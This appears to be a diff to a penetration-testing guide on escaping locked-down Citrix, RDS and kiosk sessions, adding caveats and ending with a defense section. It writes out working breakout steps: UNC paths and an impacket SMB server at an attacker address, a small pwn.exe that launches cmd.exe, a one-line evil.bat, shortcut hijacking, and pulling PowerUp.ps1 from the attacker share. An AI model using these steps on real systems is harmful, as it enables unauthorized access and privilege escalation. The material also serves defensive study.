@@ -18,8 +18,9 @@ Published-application and kiosk platforms (Citrix, RDS/Terminal Services, AWS Ap
 
 ```
 # 1. In any app, open a file dialog (Paint → File → Open), set type = All Files, then:
-\\127.0.0.1\c$\users\<you>        # UNC path bypasses File Explorer folder GPO
-\\10.10.14.3\share               # reach an attacker SMB share (smbserver.py)
+C:\users\<you>                   # type the local path directly - bypasses File Explorer folder GPO
+\\127.0.0.1\c$\users\<you>        # same via loopback UNC - but c$ needs local admin
+\\10.10.14.3\share               # reach an attacker SMB share (authenticated smbserver.py)
 
 # 2. Right-click a dropped .exe → Open  (pwn.exe = system("cmd.exe"))  → real shell
 #    or: modify a shortcut's Target to cmd.exe; or drop evil.bat containing "cmd"
@@ -49,20 +50,22 @@ Several routes from the open dialog to a real shell - try them in roughly this o
 Folder-browsing GPO that blocks `C:\Users` in Explorer typically doesn't block **UNC paths** typed into a dialog's *File name* field. Set the file-type filter to **All Files (\*.\*)** and enter:
 
 ```
-\\127.0.0.1\c$\users\pmorgan          # loopback admin share → local filesystem
+C:\users\pmorgan                      # direct local path - no SMB, no special rights
+\\127.0.0.1\c$\users\pmorgan          # loopback UNC variant
 ```
 
-The dialog navigates there, giving you a view of the filesystem Explorer refused.
+The dialog navigates there, giving you a view of the filesystem Explorer refused. Prefer typing the **local path** directly - it needs no privileges. The `c$` administrative share only works if your session account has **local admin** rights (ordinary kiosk users can't reach `c$`); when you lack that, use the local path or a share you can actually read.
 
 ### Launch a binary from an SMB share
 
-The dialog reaches remote UNC paths too, so stage tools on an attacker SMB share rather than fighting file-copy restrictions. Start a server:
+The dialog reaches remote UNC paths too, so stage tools on an attacker SMB share rather than fighting file-copy restrictions. Start a server - use an **authenticated** share, because modern Windows blocks insecure *guest* SMB logons by default (a bare guest share won't mount):
 
 ```shell
-smbserver.py -smb2support share $(pwd)      # impacket, on your Linux host
+smbserver.py -smb2support -user pwn -password pwn share $(pwd)   # impacket, authenticated
+# then from the session:  net use \\10.10.14.3\share /user:pwn pwn
 ```
 
-In the dialog, browse to `\\10.10.14.3\share` (All Files). You often can't *copy* out (Explorer restrictions), but you can **right-click an executable → Open** to run it in place. A tiny custom binary that just shells out defeats any "cmd.exe is blocked" name check:
+In the dialog, browse to `\\10.10.14.3\share` (All Files). You often can't *copy* out (Explorer restrictions), but you can **right-click an executable → Open** to run it in place. A tiny custom binary that just shells out gets you a prompt when `cmd.exe` is merely *hidden* (no Start-menu entry, Explorer blocked) rather than blocked by name:
 
 ```c
 // pwn.c  →  compile to pwn.exe
@@ -70,7 +73,7 @@ In the dialog, browse to `\\10.10.14.3\share` (All Files). You often can't *copy
 int main() { system("C:\\Windows\\System32\\cmd.exe"); }
 ```
 
-Right-click `pwn.exe` → Open → a Command Prompt appears. If share access is flaky, `xcopy \\10.10.14.3\share\PowerUp.ps1 .\` pulls files once you have any shell.
+Right-click `pwn.exe` → Open → a Command Prompt appears. Note the limit: `system()` itself invokes the command interpreter, so this **doesn't** defeat an allowlisting policy (AppLocker/WDAC) that blocks `cmd.exe` *execution* - there `pwn.exe` fails too. It only helps where the shell is hidden/undiscoverable but launching executables is still permitted. If share access is flaky, `xcopy \\10.10.14.3\share\PowerUp.ps1 .\` pulls files once you have any shell.
 
 ### Alternate file and registry editors
 
@@ -81,17 +84,17 @@ When File Explorer itself is the thing locked down, portable third-party editors
 
 ### Modify an existing shortcut
 
-Shortcuts are editable by the user: right-click any `.lnk` → **Properties** → set **Target** to `C:\Windows\System32\cmd.exe` (or a script) → run it. If no shortcut is present, copy one from the share or generate a malicious `.lnk` with PowerShell.
+A `.lnk` you can write to is editable: right-click → **Properties** → set **Target** to `C:\Windows\System32\cmd.exe` (or a script) → run it. Watch the ACL, though - published shortcuts under the **shared** Start menu (`C:\ProgramData\Microsoft\Windows\Start Menu`) are usually **not** writable by kiosk users, so editing those fails. Use one in a user-writable location (your Desktop / profile), copy a shortcut there first, or generate a fresh malicious `.lnk` with PowerShell.
 
 ### Script auto-execution
 
-If `.bat` / `.vbs` / `.ps1` are associated with their interpreters, a dropped script runs on double-click. The minimal breakout is a one-line `evil.bat`:
+If `.bat` / `.vbs` / `.ps1` are associated with their interpreters, a dropped script runs when **launched from the shell** (Explorer, a portable file manager, the Desktop) via its association. The minimal breakout is a one-line `evil.bat`:
 
 ```bat
 cmd
 ```
 
-Double-clicking it spawns an interactive Command Prompt.
+Launching it (double-click **in Explorer/Explorer++**, or right-click → Open) spawns an interactive Command Prompt. Note: **double-clicking inside an application's Open dialog won't run it** - the dialog submits the file to the app (Paint would try to open `evil.bat` as an image). From a file picker, use the right-click → **Open** context action instead, which invokes the shell association.
 
 ## Step 3 - escalate from the shell
 
@@ -127,10 +130,10 @@ The full treatment - enumeration, the registry-hijack and DLL-hijack families, a
 
 ## Defense
 
-- Don't rely on File Explorer / Start-menu GPO alone - it doesn't constrain dialog boxes, UNC paths, or portable apps. Enforce **application allowlisting (AppLocker / WDAC)** so only approved binaries run, which blocks `pwn.exe`, Explorer++, alternate regedit tools, and dropped scripts regardless of how they're launched.
+- Don't rely on File Explorer / Start-menu GPO alone - it doesn't constrain dialog boxes, UNC paths, or portable apps. Enforce **application allowlisting (AppLocker / WDAC)** so only approved *binaries* run, which blocks `pwn.exe`, Explorer++, and alternate regedit tools. But binary rules don't automatically cover **scripts**: WDAC doesn't directly allowlist `.bat`/`.cmd` (an allowed `cmd.exe` will run them), and AppLocker's Script rule collection must be enforced *separately*. Turn on script/interpreter control explicitly, or the `evil.bat` route survives.
 - Disable command-line interpreters and script-host associations for kiosk users (`cmd`, `powershell`, `.bat`/`.vbs`/`.ps1` auto-run), and block loopback/remote UNC access (`\\127.0.0.1\c$`, outbound SMB) from the session.
 - Remove or lock the published app's file-dialog features where the business case allows; constrain the Save/Open paths.
-- Never leave AlwaysInstallElevated set in a published-desktop image, and keep UAC patched and at Always Notify - the breakout is only valuable if escalation follows.
+- Never leave AlwaysInstallElevated set in a published-desktop image, and keep UAC patched and at Always Notify. But don't treat the breakout as harmless without escalation: a shell as the session user already exposes that user's credentials, accessible files, and reachable network resources - contain the breakout itself, not just the escalation that may follow.
 - Monitor published-desktop sessions for `cmd`/`powershell` spawned from Office/Paint/browser parents and for new local accounts.
 
 ## Related
